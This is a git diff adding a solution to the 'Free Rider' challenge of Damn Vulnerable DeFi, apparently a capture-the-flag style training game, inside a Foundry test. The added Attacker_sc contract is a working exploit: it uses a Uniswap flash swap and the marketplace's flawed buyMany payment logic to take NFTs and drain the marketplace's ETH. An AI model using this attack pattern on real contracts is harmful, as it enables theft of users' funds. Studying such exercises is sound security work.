@@ -148,9 +148,17 @@ contract FreeRider is Test {
     }
 
     function testExploit() public {
+        //Had some difficulties for finding the solution and now understand thanks to https://ventral.digital/posts/2022/3/2/damn-vulnerable-defi-v2-10-free-rider
         /** EXPLOIT START **/
-        vm.startPrank(attacker, attacker);
-
+        vm.startPrank(attacker, attacker); //tx.origin
+        Attacker_sc exploit = new Attacker_sc(
+            uniswapV2Pair,
+            weth,
+            freeRiderNFTMarketplace,
+            freeRiderBuyer,
+            damnValuableNFT
+        );
+        exploit.pwn{value: 0.5 ether}();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
@@ -182,4 +190,80 @@ contract FreeRider is Test {
             MARKETPLACE_INITIAL_ETH_BALANCE
         );
     }
+}
+
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Attacker_sc is IERC721Receiver {
+    IUniswapV2Pair pair;
+    WETH9 weth;
+    FreeRiderNFTMarketplace marketPlace;
+    FreeRiderBuyer buyer;
+    DamnValuableNFT nft;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        WETH9 _weth,
+        FreeRiderNFTMarketplace _marketPlace,
+        FreeRiderBuyer _buyer,
+        DamnValuableNFT _nft
+    ) {
+        pair = _pair;
+        weth = _weth;
+        marketPlace = _marketPlace;
+        buyer = _buyer;
+        nft = _nft;
+
+        nft.setApprovalForAll(address(marketPlace), true);
+    }
+
+    function pwn() public payable {
+        weth.deposit{value: msg.value}();
+        pair.swap(0, 100 ether, address(this), new bytes(1));
+        weth.withdraw(weth.balanceOf(address(this)));
+        payable(msg.sender).call{value: address(this).balance}("");
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint256 _dvt,
+        uint256 wethAmount,
+        bytes calldata data
+    ) external {
+        uint256[] memory buy = new uint256[](6);
+        for (uint8 i = 0; i < 6; ++i) {
+            buy[i] = i;
+        }
+        weth.withdraw(wethAmount);
+        marketPlace.buyMany{value: 15 ether}(buy);
+        uint256 amount_eth = address(marketPlace).balance;
+        uint8 len = 2;
+        uint256[] memory nftIdx = new uint256[](len);
+        uint256[] memory nftOffers = new uint256[](len);
+        for (uint8 i = 0; i < len; ++i) {
+            nftIdx[i] = 0;
+            nftOffers[i] = amount_eth;
+        }
+        marketPlace.offerMany(nftIdx, nftOffers);
+        marketPlace.buyMany{value: amount_eth}(nftIdx);
+
+        for (uint8 i = 0; i < 6; ++i) {
+            nft.safeTransferFrom(address(this), address(buyer), i);
+        }
+
+        uint256 amout_flashloan = ((wethAmount * 1000) / 997) + 1;
+        weth.deposit{value: amout_flashloan}();
+        weth.transfer(address(pair), amout_flashloan);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    ) external override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
